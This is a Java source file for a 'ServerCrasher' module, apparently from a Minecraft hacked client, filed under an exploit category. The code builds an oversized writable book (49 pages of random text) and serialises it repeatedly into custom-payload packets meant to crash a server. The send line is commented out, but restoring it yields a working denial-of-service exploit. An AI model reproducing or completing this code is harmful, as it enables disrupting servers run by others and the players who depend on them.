package me.Corbis.Execution.module.implementations;

import de.Hero.settings.Setting;
import io.netty.buffer.Unpooled;
import me.Corbis.Execution.Execution;
import me.Corbis.Execution.event.EventTarget;
import me.Corbis.Execution.event.events.EventMotionUpdate;
import me.Corbis.Execution.event.events.EventUpdate;
import me.Corbis.Execution.module.Category;
import me.Corbis.Execution.module.Module;
import me.Corbis.Execution.utils.RandomUtils;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0CPacketInput;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.lwjgl.input.Keyboard;

import java.util.Set;

public class ServerCrasher extends Module {

    public Setting interval;
    public ServerCrasher(){
        super("ServerCrasher", Keyboard.KEY_NONE, Category.EXPLOIT);
        Execution.instance.settingsManager.rSetting(interval = new Setting("Interval", this, 1, 1, 10, true));
    }

    @EventTarget
    public void onUpdate(EventMotionUpdate event){
        if(mc.thePlayer == null || !event.isPre() || mc.getDebugFPS() < 5)
            return;
        ItemStack bookStack = new ItemStack(Items.writable_book);
        NBTTagCompound bookCompound = new NBTTagCompound();
        bookCompound.setString("author", RandomUtils.randomNumber(20));
        bookCompound.setString("title", RandomUtils.randomNumber(20));
        NBTTagList pageList = new NBTTagList();
        String pageText = RandomUtils.randomNumber(600);
        for(int i = 0; i < 49; i++){
            pageList.appendTag(new NBTTagString(pageText));
        }

        bookCompound.setTag("pages", pageList);
        bookStack.setTagCompound(bookCompound);
        for(int i = 0; i < 99 * interval.getValInt(); i++){
            PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
            packetBuffer.writeItemStackToBuffer(bookStack);
        //    mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|BSign", packetBuffer));
        }
  //      mc.theWorld = null;
    //    mc.thePlayer = null;
      //  mc.displayGuiScreen(new GuiMainMenu());



    }
}
